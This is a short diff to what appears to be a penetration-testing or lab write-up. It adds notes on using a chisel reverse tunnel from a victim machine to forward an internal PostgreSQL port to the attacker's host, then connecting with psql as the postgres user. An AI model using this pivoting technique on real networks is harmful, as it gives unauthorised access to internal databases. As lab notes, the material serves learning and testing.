@@ -36,3 +36,7 @@ On the victim's machine:
 ```
 ./chisel client -v 10.10.16.81:9002 R:5432:172.22.0.1:5432
 ```
+
+And now on the atacker's machine we have the ports 5432 connected. The usage wil be on another tab: `psql -h 10.10.16.81 -U "postgres" -p 5432`
+
+``
